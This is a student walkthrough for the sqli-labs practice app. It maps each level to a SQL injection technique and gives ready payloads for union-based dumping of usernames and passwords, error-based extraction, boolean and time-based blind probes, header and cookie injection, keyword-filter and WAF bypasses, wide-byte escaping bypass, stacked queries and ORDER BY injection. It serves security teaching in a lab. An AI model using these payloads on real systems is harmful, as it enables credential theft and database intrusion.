---
title: sqli-labs Walkthrough Notes
---
## sqli-labs SQL Injection Level Practice Reference Table

### Preface

This document helps students quickly map SQL injection techniques to the corresponding sqli-labs levels.

It covers:

- Which levels correspond to each injection type
- The core closure method for each level
- Plain-language concept explanations
- Common test statements
- Suggested classroom practice order

> The following statements are only for local labs, sqli-labs, DVWA, test environments, and authorized security testing.

---

## 1. Overall Practice Route

Students are recommended to practice in this order:

```text
Less-1 ~ Less-4     Basic GET union-based injection
Less-5 ~ Less-6     Error-based injection
Less-7              File-write concept
Less-8              Boolean blind injection
Less-9 ~ Less-10    Time-based blind injection
Less-11 ~ Less-17   POST injection
Less-18 ~ Less-19   Header injection
Less-20 ~ Less-22   Cookie injection
Less-23 ~ Less-28a  Filter bypass
Less-29 ~ Less-31   WAF / parameter pollution
Less-32 ~ Less-37   Wide-byte injection
Less-38 ~ Less-45   Stacked queries
Less-46 ~ Less-53   Order by injection
Less-54 ~ Less-65   Comprehensive challenges
```

---

## 2. Basic SQL Injection Concepts

### 2.1 Plain-Language Understanding

SQL injection does not mean "the database has a backdoor"; it means the backend code directly concatenates user input into SQL.

Normal code logic:

```sql
select * from users where id='1'
```

If user input becomes:

```text
1' or '1'='1
```

The SQL becomes:

```sql
select * from users where id='1' or '1'='1'
```

`'1'='1'` is always true, so a query that should have returned only one user may become a query for all users.

---

### 2.2 Core Thinking for Identifying Injection

The most common three steps:

```text
Step 1: Add quotes and see whether an error occurs
Step 2: Construct true/false conditions and see whether the page differs
Step 3: Choose union, error-based, boolean blind, or time-based blind injection based on page behavior
```

Basic tests:

```http
?id=1'
?id=1 and 1=1
?id=1 and 1=2
?id=1' and '1'='1
?id=1' and '1'='2
```

If the page reacts differently to true and false conditions, injection may exist.

---

## 3. Less-1 to Less-4: Basic GET Union-Based Injection

### Corresponding Levels

| Level  | Type                         | Closure Method | Recommended Practice |
| ------ | ---------------------------- | -------------- | -------------------- |
| Less-1 | GET string type              | `'`            | Union query injection |
| Less-2 | GET numeric type             | No quote needed | Union query injection |
| Less-3 | GET string type with bracket | `')`           | Union query injection |
| Less-4 | GET double quote with bracket | `")`          | Union query injection |

---

### 3.1 Less-1: Single-Quote String Injection

#### Concept

The backend is likely similar to:

```sql
select * from users where id='$id' limit 0,1
```

User passes:

```http
?id=1
```

Actual SQL:

```sql
select * from users where id='1' limit 0,1
```

If the user passes:

```http
?id=1'
```

The SQL becomes:

```sql
select * from users where id='1'' limit 0,1
```

There is an extra `'`, so the database reports an error.

---

#### Test Statements

Identify injection:

```http
Less-1/?id=1'
```

Determine column count:

```http
Less-1/?id=1' order by 1 --+
Less-1/?id=1' order by 2 --+
Less-1/?id=1' order by 3 --+
Less-1/?id=1' order by 4 --+
```

If `order by 3` is normal and `order by 4` errors, the column count is `3`.

Determine reflected columns:

```http
Less-1/?id=-1' union select 1,2,3 --+
```

Dump current database:

```http
Less-1/?id=-1' union select 1,database(),version() --+
```

Dump table names:

```http
Less-1/?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+
```

Dump column names:

```http
Less-1/?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+
```

Dump data:

```http
Less-1/?id=-1' union select 1,group_concat(username,0x3a,password),3 from users --+
```

---

### 3.2 Less-2: Numeric Injection

#### Concept

Numeric injection does not require closing quotes.

The backend may be:

```sql
select * from users where id=$id limit 0,1
```

So you can directly concatenate:

```http
?id=1 and 1=1
```

---

#### Test Statements

Identify injection:

```http
Less-2/?id=1 and 1=1
Less-2/?id=1 and 1=2
```

Determine column count:

```http
Less-2/?id=1 order by 3 --+
Less-2/?id=1 order by 4 --+
```

Union query:

```http
Less-2/?id=-1 union select 1,database(),version() --+
```

Dump data:

```http
Less-2/?id=-1 union select 1,group_concat(username,0x3a,password),3 from users --+
```

---

### 3.3 Less-3: Single Quote Plus Bracket Closure

#### Concept

The backend may be:

```sql
select * from users where id=('$id') limit 0,1
```

So it must be closed with:

```text
')
```

---

#### Test Statements

Identify injection:

```http
Less-3/?id=1')
```

Union query:

```http
Less-3/?id=-1') union select 1,database(),version() --+
```

Dump data:

```http
Less-3/?id=-1') union select 1,group_concat(username,0x3a,password),3 from users --+
```

---

### 3.4 Less-4: Double Quote Plus Bracket Closure

#### Concept

The backend may be:

```sql
select * from users where id=("$id") limit 0,1
```

So the closure method is:

```text
")
```

---

#### Test Statements

Identify injection:

```http
Less-4/?id=1")
```

Union query:

```http
Less-4/?id=-1") union select 1,database(),version() --+
```

Dump data:

```http
Less-4/?id=-1") union select 1,group_concat(username,0x3a,password),3 from users --+
```

---

## 4. Less-5 to Less-6: Error-Based Injection

### Corresponding Levels

| Level  | Type                         | Closure Method | Recommended Practice      |
| ------ | ---------------------------- | -------------- | ------------------------- |
| Less-5 | GET single-quote error-based injection | `'` | updatexml / extractvalue |
| Less-6 | GET double-quote error-based injection | `"` | updatexml / extractvalue |

---

### 4.1 Plain-Language Concept

The page does not normally display database query results, but it does display database errors.

At this point, you cannot rely on `union` output. Instead, deliberately make the database report an error and put the data you want into the error message.

Core logic of error-based injection:

```text
Query data
  ↓
Concatenate it into an invalid XPath parameter
  ↓
updatexml / extractvalue reports an error
  ↓
The error message carries the data out
```

---

### 4.2 Less-5 Test Statements

Identify injection:

```http
Less-5/?id=1'
```

Dump current database:

```http
Less-5/?id=1' and updatexml(1,concat(0x7e,database(),0x7e),1) --+
```

Use `extractvalue`:

```http
Less-5/?id=1' and extractvalue(1,concat(0x7e,database(),0x7e)) --+
```

Dump table names:

```http
Less-5/?id=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) --+
```

Dump column names:

```http
Less-5/?id=1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'),0x7e),1) --+
```

Dump data:

```http
Less-5/?id=1' and updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e),1) --+
```

---

### 4.3 Less-6 Test Statements

Less-6 uses double-quote closure.

```http
Less-6/?id=1" and updatexml(1,concat(0x7e,database(),0x7e),1) --+
```

Dump table names:

```http
Less-6/?id=1" and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) --+
```

Dump data:

```http
Less-6/?id=1" and updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e),1) --+
```

---

## 5. Less-8: Boolean Blind Injection

### Corresponding Level

| Level  | Type                       | Closure Method | Recommended Practice |
| ------ | -------------------------- | -------------- | -------------------- |
| Less-8 | GET boolean blind injection | `'`           | True/false page judgment |

---

### 5.1 Plain-Language Concept

Boolean blind injection is like guessing a riddle.

The page does not display database content and does not show errors, but:

```text
Condition is true: page is normal
Condition is false: page is abnormal / blank / different
```

The attacker asks true/false questions one by one to infer database content.

---

### 5.2 Test Statements

Determine whether blind injection is possible:

```http
Less-8/?id=1' and 1=1 --+
Less-8/?id=1' and 1=2 --+
```

If the two pages differ, boolean blind injection is possible.

---

### 5.3 Guess Database Length

```http
Less-8/?id=1' and length(database())=8 --+
```

If the page is normal, the database name length is `8`.

---

### 5.4 Guess the First Character of the Database Name

```http
Less-8/?id=1' and substr(database(),1,1)='s' --+
```

ASCII form:

```http
Less-8/?id=1' and ascii(substr(database(),1,1))=115 --+
```

If the page is normal, the first character is `s`.

---

### 5.5 Guess Table Names

```http
Less-8/?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=117 --+
```

---

## 6. Less-9 to Less-10: Time-Based Blind Injection

### Corresponding Levels

| Level   | Type                              | Closure Method | Recommended Practice |
| ------- | --------------------------------- | -------------- | -------------------- |
| Less-9  | GET single-quote time blind injection | `'`       | sleep delay |
| Less-10 | GET double-quote time blind injection | `"`       | sleep delay |

---

### 6.1 Plain-Language Concept

Time-based blind injection is also guessing, but the page does not clearly differ between true and false.

So let the database "nod" for you:

```text
Condition is true: sleep for 5 seconds
Condition is false: return immediately
```

If the response is slow, the guess is correct.

---

### 6.2 Less-9 Test Statements

Identify time-based blind injection:

```http
Less-9/?id=1' and sleep(5) --+
```

Stricter judgment:

```http
Less-9/?id=1' and if(1=1,sleep(5),0) --+
Less-9/?id=1' and if(1=2,sleep(5),0) --+
```

Guess database length:

```http
Less-9/?id=1' and if(length(database())=8,sleep(5),0) --+
```

Guess the first character of the database:

```http
Less-9/?id=1' and if(ascii(substr(database(),1,1))=115,sleep(5),0) --+
```

---

### 6.3 Less-10 Test Statements

Less-10 uses double-quote closure:

```http
Less-10/?id=1" and if(1=1,sleep(5),0) --+
```

Guess database length:

```http
Less-10/?id=1" and if(length(database())=8,sleep(5),0) --+
```

Guess the first character of the database:

```http
Less-10/?id=1" and if(ascii(substr(database(),1,1))=115,sleep(5),0) --+
```

---

## 7. Less-11 to Less-17: POST Injection

### Corresponding Levels

| Level   | Type                                      | Practice Point |
| ------- | ----------------------------------------- | -------------- |
| Less-11 | POST single-quote union injection          | Login form injection |
| Less-12 | POST double-quote bracket injection        | Login form closure |
| Less-13 | POST single-quote bracket error injection  | updatexml |
| Less-14 | POST double-quote error injection          | updatexml |
| Less-15 | POST single-quote boolean blind injection  | Page true/false |
| Less-16 | POST double-quote bracket boolean blind injection | Page true/false |
| Less-17 | UPDATE-style error-based injection         | Injection at password modification |

---

### 7.1 Plain-Language Concept

GET injection parameters are in the URL:

```http
?id=1
```

POST injection parameters are in the request body:

```http
uname=admin&passwd=123456
```

The essence is exactly the same: parameters are concatenated into SQL.

---

### 7.2 Less-11 POST Union Injection

Enter in the login form:

```text
uname=admin' --+
passwd=123456
```

Determine whether bypass succeeds.

Union query:

```text
uname=' union select 1,database() --+
passwd=123456
```

If the column count is wrong, adjust according to the page:

```text
uname=' union select 1,2 --+
passwd=123456
```

---

### 7.3 Less-12 Double Quote Bracket Closure

Test:

```text
uname=admin") --+
passwd=123456
```

Union query:

```text
uname=") union select 1,database() --+
passwd=123456
```

---

### 7.4 Less-13 Error-Based Injection

```text
uname=admin') and updatexml(1,concat(0x7e,database(),0x7e),1) --+
passwd=123456
```

---

### 7.5 Less-14 Double-Quote Error-Based Injection

```text
uname=admin" and updatexml(1,concat(0x7e,database(),0x7e),1) --+
passwd=123456
```

---

### 7.6 Less-15 Boolean Blind Injection

```text
uname=admin' and 1=1 --+
passwd=123456
```

```text
uname=admin' and 1=2 --+
passwd=123456
```

Guess the first character of the database:

```text
uname=admin' and ascii(substr(database(),1,1))=115 --+
passwd=123456
```

---

### 7.7 Less-16 Double Quote Bracket Boolean Blind Injection

```text
uname=admin") and 1=1 --+
passwd=123456
```

```text
uname=admin") and ascii(substr(database(),1,1))=115 --+
passwd=123456
```

---

### 7.8 Less-17 UPDATE Error-Based Injection

#### Concept

The focus of Less-17 is not querying, but triggering SQL injection during password modification.

Typical SQL may look like:

```sql
update users set password='$passwd' where username='$uname'
```

The test statement is usually placed in the password field:

```text
uname=admin
passwd=123456' and updatexml(1,concat(0x7e,database(),0x7e),1) --+
```

If the page reports:

```text
XPATH syntax error: '~security~'
```

This indicates UPDATE-style error-based injection.

---

## 8. Less-18 to Less-19: Header Injection

### Corresponding Levels

| Level   | Injection Position | Recommended Practice |
| ------- | ------------------ | -------------------- |
| Less-18 | User-Agent         | Header error-based injection |
| Less-19 | Referer            | Header error-based injection |

---

### 8.1 Plain-Language Concept

Many systems record access logs:

```text
IP
User-Agent
Referer
Login username
```

If these request headers are directly concatenated into SQL when written to the database, header injection is produced.

---

### 8.2 Less-18 User-Agent Injection

Normal request header:

```http
User-Agent: Mozilla/5.0
```

Test:

```http
User-Agent: test' and updatexml(1,concat(0x7e,database(),0x7e),1) and '1'='1
```

---

### 8.3 Less-19 Referer Injection

Normal request header:

```http
Referer: http://localhost/
```

Test:

```http
Referer: test' and updatexml(1,concat(0x7e,database(),0x7e),1) and '1'='1
```

---

## 9. Less-20 to Less-22: Cookie Injection

### Corresponding Levels

| Level   | Type                            | Recommended Practice |
| ------- | ------------------------------- | -------------------- |
| Less-20 | Cookie single-quote injection    | Error-based / union |
| Less-21 | Cookie Base64-encoded injection  | Inject after encoding |
| Less-22 | Cookie double-quote injection    | Error-based / union |

---

### 9.1 Plain-Language Concept

Cookies are also user-controllable input.

If the backend writes:

```sql
select * from users where username='$cookie_user'
```

Then an attacker can inject by modifying the cookie.

---

### 9.2 Less-20 Test Statements

After login, modify the cookie, for example:

```http
Cookie: uname=admin'
```

Error-based injection:

```http
Cookie: uname=admin' and updatexml(1,concat(0x7e,database(),0x7e),1) --+
```

---

### 9.3 Less-21 Base64 Cookie Injection

The cookie in Less-21 is usually Base64-encoded.

Original payload:

```text
admin' and updatexml(1,concat(0x7e,database(),0x7e),1) --+
```

It must be Base64-encoded first, then placed into the cookie.

Concept focus:

```text
Encoding is not defense
If the backend decodes it and continues concatenating SQL, injection still works
```

---

### 9.4 Less-22 Double-Quote Cookie Injection

```http
Cookie: uname=admin" and updatexml(1,concat(0x7e,database(),0x7e),1) --+
```

---

## 10. Less-23 to Less-28a: Filter Bypass

### Corresponding Levels

| Level    | Main Filter Point          | Recommended Practice |
| -------- | -------------------------- | -------------------- |
| Less-23  | Comment marker filtering   | Close without comments |
| Less-24  | Second-order injection     | Register, then change password |
| Less-25  | Filters `or` / `and`       | Double-write / symbol bypass |
| Less-25a | Numeric filter bypass      | Keyword filtering |
| Less-26  | Filters spaces and comments | Encoding / bracket bypass |
| Less-26a | Bracket scenario filter bypass | Encoding bypass |
| Less-27  | Filters `union` / `select` | Case changes / double-write |
| Less-27a | Double-quote scenario filter bypass | Double-write / transformation |
| Less-28  | Strong `union select` filter | Double-write bypass |
| Less-28a | Variant bypass             | Combined bypass |

---

### 10.1 Less-23: Comment Marker Filtering

#### Concept

Conventional form:

```http
?id=1' --+
```

If comment markers are filtered, you cannot rely on `--+` to truncate the remaining SQL.

You need to make the SQL close itself completely.

---

#### Test Statements

Boolean judgment without comments:

```http
Less-23/?id=1' and '1'='1
Less-23/?id=1' and '1'='2
```

Union query:

```http
Less-23/?id=-1' union select 1,database(),'3
```

The final `'3` is used to complete the trailing single quote.

---

### 10.2 Less-24: Second-Order Injection

#### Concept

Second-order injection has two steps:

```text
Step 1: Malicious data is first stored in the database
Step 2: The system later reads it and concatenates it into SQL, triggering injection
```

---

#### Practice Flow

Register username:

```text
admin'#
```

Any password:

```text
123456
```

Then log in as this user and enter the password modification function.

The backend may execute:

```sql
update users set password='newpass' where username='admin'#'
```

The final actual affected condition is:

```sql
where username='admin'
```

This is second-order injection.

---

### 10.3 Less-25 / Less-25a: Filtering `and` / `or`

#### Concept

If these are filtered:

```text
and
or
```

Try:

```text
&&
||
Double-write bypass
Case bypass
```

---

#### Test Statements

```http
Less-25/?id=1' && '1'='1' --+
Less-25/?id=1' && '1'='2' --+
```

If filtering is not strict, double-writing can also be tried:

```http
Less-25/?id=1' aandnd '1'='1' --+
```

---

### 10.4 Less-26 / Less-26a: Filtering Spaces and Comments

#### Concept

If spaces are filtered, use:

```text
%09
%0a
%0b
%0c
%0d
/**/
brackets
```

---

#### Test Statements

```http
Less-26/?id=1'%0aand%0a'1'='1
```

Union query:

```http
Less-26/?id=-1'%0aunion%0aselect%0a1,database(),'3
```

---

### 10.5 Less-27 to Less-28a: `union` / `select` Bypass

#### Concept

If `union select` is filtered, try:

```text
Case obfuscation
Double-write bypass
Inline comments
Newline characters
```

---

#### Test Statements

Case changes:

```http
Less-27/?id=-1' UnIoN SeLeCt 1,database(),3 --+
```

Double-writing:

```http
Less-27/?id=-1' uniunionon selselectect 1,database(),3 --+
```

Newline:

```http
Less-28/?id=-1')%0aunion%0aselect%0a1,database(),3 --+
```

---

## 11. Less-29 to Less-31: WAF / Parameter Pollution

### Corresponding Levels

| Level   | Type             | Recommended Practice |
| ------- | ---------------- | -------------------- |
| Less-29 | HPP / WAF bypass | Parameter pollution |
| Less-30 | HPP double quote | Parameter pollution |
| Less-31 | HPP double quote bracket | Parameter pollution |

---

### 11.1 Plain-Language Concept

HPP means HTTP Parameter Pollution.

For example:

```http
?id=1&id=2
```

Some WAFs check the first `id=1`, but the backend actually uses the second `id=2`.

This may cause:

```text
The WAF sees a safe parameter
The backend executes a malicious parameter
```

---

### 11.2 Test Statements

Less-29:

```http
Less-29/?id=1&id=-1' union select 1,database(),3 --+
```

Less-30:

```http
Less-30/?id=1&id=-1" union select 1,database(),3 --+
```

Less-31:

```http
Less-31/?id=1&id=-1") union select 1,database(),3 --+
```

---

## 12. Less-32 to Less-37: Wide-Byte Injection

### Corresponding Levels

| Level   | Type                                      | Recommended Practice |
| ------- | ----------------------------------------- | -------------------- |
| Less-32 | GET wide-byte injection                    | `%df'` |
| Less-33 | Bypass `addslashes`                        | `%df'` |
| Less-34 | POST wide-byte injection                   | Encoding bypass |
| Less-35 | Numeric / `addslashes` failure concept     | Wide-byte related |
| Less-36 | Bypass `mysql_real_escape_string`          | `%df'` |
| Less-37 | POST bypass `mysql_real_escape_string`     | Encoding bypass |

---

### 12.1 Plain-Language Concept

Normal escaping:

```text
' becomes \'
```

Attacker input:

```text
%df'
```

After escaping, the bytes become:

```text
%df%5c%27
```

In a GBK environment:

```text
%df%5c
```

may be recognized as one wide-byte character. The backslash `\` is "eaten", leaving the `'` to close the SQL again.

In one sentence:

```text
Wide-byte injection does not mean the single quote was not escaped
It means the backslash was swallowed by the preceding wide byte
```

---

### 12.2 Less-32 Test Statements

Identify injection:

```http
Less-32/?id=1%df'
```

Union query:

```http
Less-32/?id=-1%df' union select 1,database(),version() --+
```

Dump data:

```http
Less-32/?id=-1%df' union select 1,group_concat(username,0x3a,password),3 from users --+
```

---

### 12.3 Less-33 / Less-36 Test Statements

```http
Less-33/?id=-1%df' union select 1,database(),version() --+
```

```http
Less-36/?id=-1%df' union select 1,database(),version() --+
```

---

### 12.4 Less-34 / Less-37 POST Wide-Byte Injection

Submit in POST parameters:

```text
uname=admin%df' union select 1,database() --+
passwd=123456
```

Different versions may require adjusting according to the column count:

```text
uname=admin%df' union select 1,2 --+
passwd=123456
```

---

## 13. Less-38 to Less-45: Stacked Queries

### Corresponding Levels

| Level   | Type                         | Recommended Practice |
| ------- | ---------------------------- | -------------------- |
| Less-38 | GET single-quote stacked injection | `;` multiple statements |
| Less-39 | GET numeric stacked injection | `;` multiple statements |
| Less-40 | GET bracket stacked injection | Close bracket |
| Less-41 | GET numeric blind stacked injection | Multiple statements |
| Less-42 | POST login stacked injection | Login form |
| Less-43 | POST bracket stacked injection | Login form |
| Less-44 | POST blind stacked injection | No obvious output |
| Less-45 | POST complex closure stacked injection | Login form |

---

### 13.1 Plain-Language Concept

Ordinary injection works within one SQL statement:

```sql
select * from users where id='1'
```

Stacked injection uses a semicolon to end the first SQL statement, then writes a second SQL statement:

```sql
select * from users where id='1'; select database();
```

In one sentence:

```text
union combines query results
stacked queries execute multiple SQL statements at once
```

---

### 13.2 Less-38 Test Statements

Check whether multiple statements are supported:

```http
Less-38/?id=1'; select sleep(5) --+
```

If there is an obvious delay, the stacked statement was executed.

Query verification:

```http
Less-38/?id=1'; select database() --+
```

Some pages do not display the result of the second statement, so stacked queries are often judged together with time delay.

---

### 13.3 Less-39 Numeric Stacked Injection

```http
Less-39/?id=1; select sleep(5) --+
```

---

### 13.4 Less-40 Bracket Closure

```http
Less-40/?id=1'); select sleep(5) --+
```

---

### 13.5 Less-42 Login Form Stacked Injection

Test in the username or password field:

```text
login_user=admin'; select sleep(5) --+
login_password=123456
```

Or adjust according to the specific form fields.

---

## 14. Less-46 to Less-53: Order By Injection

### Corresponding Levels

| Level   | Type                            | Recommended Practice |
| ------- | ------------------------------- | -------------------- |
| Less-46 | ORDER BY numeric error-based     | `sort` parameter |
| Less-47 | ORDER BY string error-based      | `sort` parameter |
| Less-48 | ORDER BY numeric blind injection | Boolean/time |
| Less-49 | ORDER BY string blind injection  | Boolean/time |
| Less-50 | ORDER BY numeric stacked injection | Multiple statements |
| Less-51 | ORDER BY string stacked injection | Multiple statements |
| Less-52 | ORDER BY numeric blind stacked injection | Multiple statements |
| Less-53 | ORDER BY string blind stacked injection | Multiple statements |

---

### 14.1 Plain-Language Concept

Many business features allow users to control sorting:

```http
?sort=id
?sort=username
?sort=create_time
```

The backend may write:

```sql
select * from users order by $sort
```

If `$sort` is not restricted by a whitelist, injection may occur.

---

### 14.2 Less-46 Test Statements

Normal access:

```http
Less-46/?sort=1
```

Time judgment:

```http
Less-46/?sort=if(1=1,sleep(5),1)
```

Guess the first character of the database:

```http
Less-46/?sort=if(ascii(substr(database(),1,1))=115,sleep(5),1)
```

---

### 14.3 Less-47 String ORDER BY

```http
Less-47/?sort=1' and if(1=1,sleep(5),1) --+
```

Or adjust according to the page closure:

```http
Less-47/?sort=1' procedure analyse(extractvalue(rand(),concat(0x7e,database())),1) --+
```

---

### 14.4 Less-50 to Less-53 Stacked ORDER BY

Less-50 numeric:

```http
Less-50/?sort=1; select sleep(5) --+
```

Less-51 string:

```http
Less-51/?sort=1'; select sleep(5) --+
```

Less-52 numeric blind stacked:

```http
Less-52/?sort=1; select if(length(database())=8,sleep(5),0) --+
```

Less-53 string blind stacked:

```http
Less-53/?sort=1'; select if(length(database())=8,sleep(5),0) --+
```

---

## 15. Less-54 to Less-65: Comprehensive Challenges

### Corresponding Levels

| Level   | Main Type                         | Recommended Practice |
| ------- | --------------------------------- | -------------------- |
| Less-54 | Challenge union injection          | Limited attempts |
| Less-55 | Challenge bracket closure          | Union injection |
| Less-56 | Challenge transformed closure      | Union injection |
| Less-57 | Challenge double-quote closure     | Union injection |
| Less-58 | Challenge error-based injection    | updatexml |
| Less-59 | Challenge numeric error-based      | updatexml |
| Less-60 | Challenge double-quote bracket error-based | updatexml |
| Less-61 | Challenge complex bracket error-based | updatexml |
| Less-62 | Challenge boolean blind injection  | Limited attempts |
| Less-63 | Challenge single-quote blind injection | Limited attempts |
| Less-64 | Challenge bracket blind injection  | Limited attempts |
| Less-65 | Challenge double-bracket blind injection | Limited attempts |

---

### 15.1 Plain-Language Concept

This group does not teach new syntax; it tests comprehensive judgment:

```text
First determine the closure method
Then determine the column count
Then determine reflected columns
Then choose union / error-based / blind injection
```

The core ability is:

```text
Do not memorize payloads
Learn to judge the SQL structure
```

---

### 15.2 Less-54 Example

Determine closure:

```http
Less-54/?id=1'
```

Determine column count:

```http
Less-54/?id=1' order by 3 --+
```

Union query:

```http
Less-54/?id=-1' union select 1,database(),3 --+
```

---

### 15.3 Less-55 Example

Common closure:

```text
)
```

Test:

```http
Less-55/?id=1)
```

Union query:

```http
Less-55/?id=-1) union select 1,database(),3 --+
```

---

### 15.4 Less-58 Error-Based Challenge

```http
Less-58/?id=1' and updatexml(1,concat(0x7e,database(),0x7e),1) --+
```

---

### 15.5 Less-62 Boolean Blind Challenge

Judge true/false:

```http
Less-62/?id=1' and 1=1 --+
Less-62/?id=1' and 1=2 --+
```

Guess database length:

```http
Less-62/?id=1' and length(database())=8 --+
```

Guess character:

```http
Less-62/?id=1' and ascii(substr(database(),1,1))=115 --+
```

---

## 16. Quick Index by Injection Technique

### 16.1 Union-Based Injection

Corresponding levels:

```text
Less-1
Less-2
Less-3
Less-4
Less-11
Less-12
Less-20
Less-54
Less-55
Less-56
Less-57
```

Core concept:

```text
If the page has a data display position, use union select to splice query results onto the page
```

General flow:

```http
?id=1' order by 3 --+
?id=-1' union select 1,2,3 --+
?id=-1' union select 1,database(),version() --+
```

---

### 16.2 Error-Based Injection

Corresponding levels:

```text
Less-5
Less-6
Less-13
Less-14
Less-17
Less-18
Less-19
Less-20
Less-21
Less-22
Less-58
Less-59
Less-60
Less-61
```

Core concept:

```text
If the page does not display query results but displays database errors, put data into the error message
```

General statement:

```http
?id=1' and updatexml(1,concat(0x7e,database(),0x7e),1) --+
```

---

### 16.3 Boolean Blind Injection

Corresponding levels:

```text
Less-8
Less-15
Less-16
Less-48
Less-49
Less-62
Less-63
Less-64
Less-65
```

Core concept:

```text
The page only tells you true or false; it does not directly tell you the data
```

General statements:

```http
?id=1' and length(database())=8 --+
?id=1' and ascii(substr(database(),1,1))=115 --+
```

---

### 16.4 Time-Based Blind Injection

Corresponding levels:

```text
Less-9
Less-10
Less-15
Less-16
Less-48
Less-49
Less-62
Less-63
Less-64
Less-65
```

Core concept:

```text
If the page does not differ, make the database delay and use response time to judge true/false
```

General statements:

```http
?id=1' and if(length(database())=8,sleep(5),0) --+
?id=1' and if(ascii(substr(database(),1,1))=115,sleep(5),0) --+
```

---

### 16.5 Second-Order Injection

Corresponding level:

```text
Less-24
```

Core concept:

```text
The first submission does not trigger injection; malicious data is stored first.
The second time, the system reads this data and concatenates SQL, triggering injection.
```

Practice flow:

```text
Register username: admin'#
Log in as that user
Enter password modification
Observe whether the admin user's password is affected
```

---

### 16.6 Wide-Byte Injection

Corresponding levels:

```text
Less-32
Less-33
Less-34
Less-35
Less-36
Less-37
```

Core concept:

```text
%df combines with the backslash to form a wide-byte character, eats the escape character, and releases the single quote
```

General statement:

```http
?id=-1%df' union select 1,database(),version() --+
```

---

### 16.7 Stacked Queries

Corresponding levels:

```text
Less-38
Less-39
Less-40
Less-41
Less-42
Less-43
Less-44
Less-45
Less-50
Less-51
Less-52
Less-53
```

Core concept:

```text
Use a semicolon to end the first SQL statement, then execute the second SQL statement
```

Safe practice statements:

```http
?id=1'; select sleep(5) --+
?id=1; select sleep(5) --+
```

---

### 16.8 Header Injection

Corresponding levels:

```text
Less-18
Less-19
```

Core concept:

```text
URL parameters are not the only injectable input; request headers may also be written into the database
```

Test positions:

```http
User-Agent
Referer
X-Forwarded-For
```

---

### 16.9 Cookie Injection

Corresponding levels:

```text
Less-20
Less-21
Less-22
```

Core concept:

```text
Cookies are also user-controllable input; if the backend concatenates them into SQL, injection occurs
```

Test statement:

```http
Cookie: uname=admin' and updatexml(1,concat(0x7e,database(),0x7e),1) --+
```

---

### 16.10 Order By Injection

Corresponding levels:

```text
Less-46
Less-47
Less-48
Less-49
Less-50
Less-51
Less-52
Less-53
```

Core concept:

```text
Sorting fields must not be directly controlled by users; the part after order by can also become an injection point
```

Test statement:

```http
?sort=if(ascii(substr(database(),1,1))=115,sleep(5),1)
```

---

## 17. Practice Mnemonic

```text
Check errors first, determine the closure;
Then check fields, try order by;
If the page displays data, use union;
If the page reports errors, use updatexml;
If the page has true/false behavior, use boolean blind injection;
If the page shows no difference, use sleep;
If the parameter is in POST, the essence is unchanged;
If the parameter is in Cookie/Header, it can still inject;
If keywords are filtered, practice bypass;
When you meet GBK, think wide-byte;
When you see semicolon multi-statements, it is stacked queries;
When you see sort/order, think order injection.
```

---

## 18. Suggested Classroom Practice Order

### Stage 1: Basic Introduction

```text
Less-1
Less-2
Less-3
Less-4
```

Goal:

```text
Master closure methods, column count, reflected columns, and union select
```

### Stage 2: No-Output Scenarios

```text
Less-5
Less-6
Less-8
Less-9
Less-10
```

Goal:

```text
Master error-based injection, boolean blind injection, and time-based blind injection
```

### Stage 3: Parameter Position Changes

```text
Less-11
Less-12
Less-18
Less-19
Less-20
Less-21
Less-22
```

Goal:

```text
Understand that GET / POST / Header / Cookie are essentially the same
```

### Stage 4: Bypass and Advanced Practice

```text
Less-23
Less-24
Less-25
Less-26
Less-27
Less-28
Less-32
Less-33
Less-36
```

Goal:

```text
Master filter bypass, second-order injection, and wide-byte injection
```

### Stage 5: Complex SQL Positions

```text
Less-38
Less-39
Less-46
Less-47
Less-50
Less-51
Less-53
```

Goal:

```text
Master stacked queries and order by injection
```

### Stage 6: Comprehensive Assessment

```text
Less-54 ~ Less-65
```

Goal:

```text
Move beyond fixed payloads and independently judge closure methods and injection types
```
